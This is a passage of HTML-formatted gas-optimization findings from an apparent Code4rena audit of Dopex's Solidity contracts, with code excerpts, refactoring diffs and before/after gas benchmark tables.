class=\"grvsc-source\"><span class=\"mtk1\">     _mint(to, tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><strong>Another instance</strong>\n<a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L14\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L14</a></p>\n<h3 id=\"perpetualatlanticvaultsol_mintoptiontoken-save-132-gas-on-average\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultsol_mintoptiontoken-save-132-gas-on-average\" aria-label=\"perpetualatlanticvaultsol_mintoptiontoken save 132 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PerpetualAtlanticVault.sol._mintOptionToken(): (Save ~132 Gas on average)</h3>\n<p><em>Benchmarks based on function purchase which calls the private function <code>_mintOptionToken()</code></em></p>\n<p><em><code>Test: Purchase(uint256,address)(uint256)</code></em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>312368</td>\n<td>333657</td>\n<td>333657</td>\n<td>354946</td>\n</tr>\n<tr>\n<td>After</td>\n<td>312236</td>\n<td>333525</td>\n<td>333525</td>\n<td>354814</td>\n</tr>\n</tbody>\n</table>\n<p><em><code>Test: Purchase(uint256,address)(uint256,uint256)</code></em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>17877</td>\n<td>256930</td>\n<td>221256</td>\n<td>359646</td>\n</tr>\n<tr>\n<td>After</td>\n<td>17877</td>\n<td>256809</td>\n<td>221124</td>\n<td>359515</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/utils/Counters.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:  </span><span class=\"mtk3\">/// @dev Token ID counter for write positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L588-L592\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L588-L592</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">588</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mintOptionToken</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">589</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">current</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">590</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increment</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">591</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">592</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-import { Counters } from &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { IPerpetualAtlanticVaultLP } from &quot;./IPerpetualAtlanticVaultLP.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { ContractWhitelist } from &quot;../helper/ContractWhitelist.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { Pausable } from &quot;../helper/Pausable.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -36,10 +35,9 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ContractWhitelist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   using SafeERC20 for IERC20WithBurn;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  using Counters for Counters.Counter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Token ID counter for write positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  Counters.Counter private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint256 private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Manager role which handles bootstrapping</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   bytes32 public constant MANAGER_ROLE = keccak256(&quot;MANAGER_ROLE&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -352,7 +350,7 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Transfer rdpx from rdpx rdpxV2Core to perpetual vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IERC20WithBurn(addresses.rdpx).safeTransferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      addresses.perpetualAtlanticVaultLP,//@audit Cache this call?</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -586,8 +584,10 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Internal function to mint a option token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function _mintOptionToken() private returns (uint256 tokenId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    tokenId = _tokenIdCounter.current();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _tokenIdCounter.increment();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    tokenId = _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      ++_tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _mint(addresses.rdpxV2Core, tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/reLP/ReLPContract.sol#L138-L164\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/reLP/ReLPContract.sol#L138-L164</a></p>\n<h2 id=\"g-07-since-we-are-assigning-local-values-to-the-struct-we-shouldnt-read-the-structstate-in-the-same-transactions-simply-use-the-local-variables-save-427-gas\" style=\"position:relative;\"><a href=\"#g-07-since-we-are-assigning-local-values-to-the-struct-we-shouldnt-read-the-structstate-in-the-same-transactions-simply-use-the-local-variables-save-427-gas\" aria-label=\"g 07 since we are assigning local values to the struct we shouldnt read the structstate in the same transactions simply use the local variables save 427 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Since we are assigning local values to the struct, we shouldn’t read the struct(state) in the same transactions, simply use the local variables (Save 427 Gas)</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>285281</td>\n<td>285281</td>\n<td>285281</td>\n<td>285281</td>\n</tr>\n<tr>\n<td>After</td>\n<td>284854</td>\n<td>284854</td>\n<td>284854</td>\n<td>284854</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">reLP</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReLPContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Addresses</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_tokenA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenB</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_tokenB</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        &lt;Truncated&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxOracle</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_rdpxOracle</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">ammFactory</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_ammFactory</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk12\">:</span><span class=\"mtk1\">      </span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_ammRouter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">158</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IERC20WithBurn(addresses.pair).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IERC20WithBurn(_pair).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       type(uint256).max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IERC20WithBurn(addresses.tokenA).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IERC20WithBurn(_tokenA).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       type(uint256).max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IERC20WithBurn(addresses.tokenB).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IERC20WithBurn(_tokenB).safeApprove(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _ammRouter,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       type(uint256).max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-08-when-using-storage-instead-of-memory-we-should-cache-any-fields-that-need-to-be-re-read-in-stack-variables\" style=\"position:relative;\"><a href=\"#g-08-when-using-storage-instead-of-memory-we-should-cache-any-fields-that-need-to-be-re-read-in-stack-variables\" aria-label=\"g 08 when using storage instead of memory we should cache any fields that need to be re read in stack variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] When using storage instead of memory, we should cache any fields that need to be re-read in stack variables</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L980-L985\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L980-L985</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">980</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Delegate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">981</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">9</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">983</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">984</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">15</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">985</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/core/RdpxV2Core.sol b/contracts/core/RdpxV2Core.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e28a65c..951ab24 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/core/RdpxV2Core.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/core/RdpxV2Core.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -979,10 +979,11 @@ contract RdpxV2Core is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validate(delegateId &lt; delegates.length, 14);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     Delegate storage delegate = delegates[delegateId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validate(delegate.owner == msg.sender, 9);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _activeCollateral = delegate.activeCollateral;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    amountWithdrawn = delegate.amount - delegate.activeCollateral;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    amountWithdrawn = delegate.amount - _activeCollateral;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validate(amountWithdrawn &gt; 0, 15);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    delegate.amount = delegate.activeCollateral;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    delegate.amount = _activeCollateral;</span></span></span></code></pre>\n<h2 